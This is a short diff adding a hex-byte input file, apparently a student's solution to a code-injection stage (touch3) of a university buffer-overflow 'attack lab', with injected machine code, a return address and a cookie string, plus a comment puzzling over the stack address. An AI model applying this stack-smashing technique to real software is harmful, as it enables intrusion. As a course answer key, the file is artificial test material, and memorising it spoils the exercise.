@@ -1,0 +1,10 @@
+/* padding with code inject */
+bf 3c 49 62 55 68 33 5c /* mov &cookie, %edi */
+55 55 48 c7 44 24 04 55 /* push touch3(back) */
+55 00 00 c3 00 00 00 00 /* mov touch3(front), 0x4(%rsp)   ret */
+/* code inject address */
+18 49 62 55 00 00 00 00
+/* cookie */
+00 00 00 00 31 62 39 33
+37 34 37 63 00 00 00 00
+/* i don't know why there is error when using 55624938 instead of 5562493c */
